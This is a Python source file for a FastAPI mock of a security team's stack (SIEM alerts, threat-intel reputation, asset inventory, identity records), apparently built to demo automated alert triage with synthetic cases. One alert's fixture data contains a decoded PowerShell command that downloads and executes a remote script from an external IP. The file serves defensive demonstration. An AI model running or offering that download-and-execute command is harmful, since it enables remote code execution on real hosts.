"""A stand-in for a security team's own stack, for the demo.

Plays the part of the SIEM, the threat-intel platform, the asset inventory and
the identity provider — the four systems an analyst pivots between while working
a single alert. In a real deployment these are the customer's own systems,
connected with their own credentials; nothing here is persisted by the platform.

The data is built so the pipeline can be demonstrated both ways. ALT-2291 is a
genuine intrusion that should be contained; ALT-2288 is a false positive that
should be tuned out rather than escalated. An analyst can only tell them apart by
enriching the indicators, which is exactly the work being automated.
"""

from fastapi import FastAPI, HTTPException

app = FastAPI(
    title="Sentinel Security API",
    version="1.0.0",
    description="Alerts, indicator reputation, asset inventory and identity context.",
)

ALERTS = {
    "ALT-2291": {
        "alert_id": "ALT-2291",
        "rule_name": "Encoded PowerShell spawned by Office process",
        "detected_at": "2026-08-19T02:14:08Z",
        "severity_reported": "high",
        "source": "EDR",
        "hostname": "FIN-WS-0447",
        "username": "m.okafor",
        "process_tree": [
            "OUTLOOK.EXE",
            "WINWORD.EXE -Embedding",
            "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        ],
        "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.44/a.ps1')",
        "network_connections": [
            {"remote_ip": "185.220.101.44", "remote_port": 80, "bytes_out": 1420},
            {"remote_ip": "185.220.101.44", "remote_port": 443, "bytes_out": 8840512},
        ],
        "file_hashes": ["9f2c1b4e77a0d3e8c5b6a1f0e4d7c2b9a8f3e6d1c4b7a0e3d6c9b2a5f8e1d4c7"],
        "status": "open",
        "raw_log": (
            "2026-08-19T02:14:08Z FIN-WS-0447 EDR proc_create "
            "parent=WINWORD.EXE child=powershell.exe user=CORP\\\\m.okafor "
            "cmdline='powershell -NoP -W Hidden -Enc SQBFAFgA...' integrity=Medium"
        ),
    },
    "ALT-2288": {
        "alert_id": "ALT-2288",
        "rule_name": "Encoded PowerShell spawned by Office process",
        "detected_at": "2026-08-19T01:52:31Z",
        "severity_reported": "high",
        "source": "EDR",
        "hostname": "IT-ADM-0012",
        "username": "svc_sccm",
        "process_tree": [
            "SCCM_Agent.exe",
            "powershell.exe -NoP -Enc RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdA==",
        ],
        "decoded_command": "Get-WmiObject -Class Win32_QuickFixEngineering",
        "network_connections": [
            {"remote_ip": "10.14.2.31", "remote_port": 8530, "bytes_out": 2210}
        ],
        "file_hashes": ["3a7f9c2e5d8b1a4f6e9c2b5a8d1f4e7c0b3a6d9f2e5c8b1a4d7f0e3c6b9a2d5f"],
        "status": "open",
        "raw_log": (
            "2026-08-19T01:52:31Z IT-ADM-0012 EDR proc_create "
            "parent=SCCM_Agent.exe child=powershell.exe user=CORP\\\\svc_sccm "
            "cmdline='powershell -NoP -Enc RwBlAHQA...' integrity=High"
        ),
    },
    "ALT-2304": {
        "alert_id": "ALT-2304",
        "rule_name": "Impossible travel: successful auth from two regions",
        "detected_at": "2026-08-19T03:40:17Z",
        "severity_reported": "medium",
        "source": "Identity Provider",
        "hostname": None,
        "username": "r.delacroix",
        "process_tree": [],
        "decoded_command": None,
        "network_connections": [
            {"remote_ip": "203.0.113.77", "remote_port": 443, "bytes_out": 900}
        ],
        "file_hashes": [],
        "status": "open",
        "raw_log": (
            "2026-08-19T03:40:17Z IdP auth_success user=r.delacroix ip=203.0.113.77 "
            "geo=RO prior_geo=FR delta_minutes=41"
        ),
    },
}

# Indicator reputation. 185.220.101.44 is a known malicious node; the internal
# address and the corporate egress range are not.
IOCS = {
    "185.220.101.44": {
        "indicator": "185.220.101.44",
        "type": "ipv4",
        "verdict": "malicious",
        "confidence": 94,
        "first_seen": "2026-06-02",
        "last_seen": "2026-08-18",
        "categories": ["c2", "malware-distribution"],
        "associated_campaigns": ["TA577", "Pikabot delivery"],
        "notes": "Tor exit node repeatedly used as a first-stage C2 for Pikabot loaders.",
    },
    "10.14.2.31": {
        "indicator": "10.14.2.31",
        "type": "ipv4",
        "verdict": "benign",
        "confidence": 99,
        "first_seen": None,
        "last_seen": None,
        "categories": ["internal", "patch-management"],
        "associated_campaigns": [],
        "notes": "Internal WSUS/SCCM distribution point. RFC1918 address, never routable.",
    },
    "203.0.113.77": {
        "indicator": "203.0.113.77",
        "type": "ipv4",
        "verdict": "suspicious",
        "confidence": 61,
        "first_seen": "2026-08-11",
        "last_seen": "2026-08-19",
        "categories": ["vpn-exit", "residential-proxy"],
        "associated_campaigns": [],
        "notes": "Commercial VPN egress. Common in both credential abuse and ordinary travel.",
    },
    "9f2c1b4e77a0d3e8c5b6a1f0e4d7c2b9a8f3e6d1c4b7a0e3d6c9b2a5f8e1d4c7": {
        "indicator": "9f2c1b4e77a0d3e8c5b6a1f0e4d7c2b9a8f3e6d1c4b7a0e3d6c9b2a5f8e1d4c7",
        "type": "sha256",
        "verdict": "malicious",
        "confidence": 88,
        "first_seen": "2026-07-30",
        "last_seen": "2026-08-19",
        "categories": ["loader"],
        "associated_campaigns": ["Pikabot"],
        "notes": "Pikabot loader variant. Establishes persistence via scheduled task.",
    },
    "3a7f9c2e5d8b1a4f6e9c2b5a8d1f4e7c0b3a6d9f2e5c8b1a4d7f0e3c6b9a2d5f": {
        "indicator": "3a7f9c2e5d8b1a4f6e9c2b5a8d1f4e7c0b3a6d9f2e5c8b1a4d7f0e3c6b9a2d5f",
        "type": "sha256",
        "verdict": "benign",
        "confidence": 97,
        "first_seen": "2024-01-15",
        "last_seen": "2026-08-19",
        "categories": ["signed", "microsoft"],
        "associated_campaigns": [],
        "notes": "Microsoft-signed SCCM agent binary. Present on every managed endpoint.",
    },
}

ASSETS = {
    "FIN-WS-0447": {
        "hostname": "FIN-WS-0447",
        "owner": "m.okafor",
        "department": "Finance",
        "criticality": "high",
        "os": "Windows 11 23H2",
        "patch_status": "2 critical patches outstanding",
        "network_segment": "corp-finance",
        "reachable_from_segment": ["corp-finance", "corp-shared", "fileserver-vlan"],
        "sensitive_data": ["payment runs", "vendor banking details"],
        "edr_agent": "healthy",
    },
    "IT-ADM-0012": {
        "hostname": "IT-ADM-0012",
        "owner": "it-operations",
        "department": "IT",
        "criticality": "medium",
        "os": "Windows Server 2022",
        "patch_status": "current",
        "network_segment": "it-mgmt",
        "reachable_from_segment": ["it-mgmt"],
        "sensitive_data": [],
        "edr_agent": "healthy",
        "notes": "SCCM management point. Runs scheduled inventory sweeps every 30 minutes.",
    },
}

IDENTITIES = {
    "m.okafor": {
        "username": "m.okafor",
        "display_name": "Miriam Okafor",
        "account_type": "human",
        "role": "Accounts Payable Lead",
        "privileged": False,
        "mfa_enrolled": True,
        "recent_auth": [
            {"time": "2026-08-19T01:58Z", "ip": "10.22.4.19", "geo": "FR", "result": "success"}
        ],
        "group_memberships": ["Finance-Users", "Payments-Approvers"],
        "notes": "Approves outbound payment runs. Phishing-plausible target.",
    },
    "svc_sccm": {
        "username": "svc_sccm",
        "display_name": "SCCM Service Account",
        "account_type": "service",
        "role": "Endpoint management automation",
        "privileged": True,
        "mfa_enrolled": False,
        "recent_auth": [
            {"time": "2026-08-19T01:52Z", "ip": "10.14.2.31", "geo": "internal", "result": "success"}
        ],
        "group_memberships": ["SCCM-Servers"],
        "notes": "Runs inventory and patch queries on a 30-minute schedule. Expected to spawn PowerShell.",
    },
    "r.delacroix": {
        "username": "r.delacroix",
        "display_name": "Remy Delacroix",
        "account_type": "human",
        "role": "Regional Sales Director",
        "privileged": False,
        "mfa_enrolled": True,
        "recent_auth": [
            {"time": "2026-08-19T02:59Z", "ip": "82.66.14.203", "geo": "FR", "result": "success"},
            {"time": "2026-08-19T03:40Z", "ip": "203.0.113.77", "geo": "RO", "result": "success"},
        ],
        "group_memberships": ["Sales-EMEA"],
        "notes": "Travel calendar shows an approved trip to Bucharest this week.",
    },
}


@app.get("/alerts/{alert_id}", operation_id="getAlert", summary="Fetch one alert with its raw telemetry")
def get_alert(alert_id: str) -> dict:
    """Return the full alert: process tree, network connections, hashes, raw log."""
    alert = ALERTS.get(alert_id.upper())
    if alert is None:
        raise HTTPException(404, f"No alert {alert_id}.")
    return alert


@app.get("/alerts", operation_id="listAlerts", summary="List alerts in the triage queue")
def list_alerts(status: str | None = None, severity: str | None = None) -> dict:
    """Return open alerts. `status` is one of open, closed; `severity` low..critical."""
    rows = [
        a
        for a in ALERTS.values()
        if (status is None or a["status"] == status)
        and (severity is None or a["severity_reported"] == severity)
    ]
    return {"count": len(rows), "alerts": rows}


@app.get("/ioc/{indicator}", operation_id="getIndicatorReputation", summary="Reputation for an IP, domain or hash")
def get_ioc(indicator: str) -> dict:
    """Return threat-intel reputation: verdict, confidence, categories, campaigns."""
    record = IOCS.get(indicator)
    if record is None:
        # An unknown indicator is a real answer, not an error: most are unknown.
        return {
            "indicator": indicator,
            "type": "unknown",
            "verdict": "unknown",
            "confidence": 0,
            "categories": [],
            "associated_campaigns": [],
            "notes": "No reputation on file. Absence of a record is not evidence of safety.",
        }
    return record


@app.get("/assets/{hostname}", operation_id="getAsset", summary="Asset inventory record for a host")
def get_asset(hostname: str) -> dict:
    """Return owner, criticality, patch status, segment reachability and data sensitivity."""
    asset = ASSETS.get(hostname.upper())
    if asset is None:
        raise HTTPException(404, f"No asset {hostname}.")
    return asset


@app.get("/identity/{username}", operation_id="getIdentity", summary="Identity context for a user or service account")
def get_identity(username: str) -> dict:
    """Return account type, privilege, MFA state, recent authentications and groups."""
    identity = IDENTITIES.get(username.lower())
    if identity is None:
        raise HTTPException(404, f"No identity {username}.")
    return identity
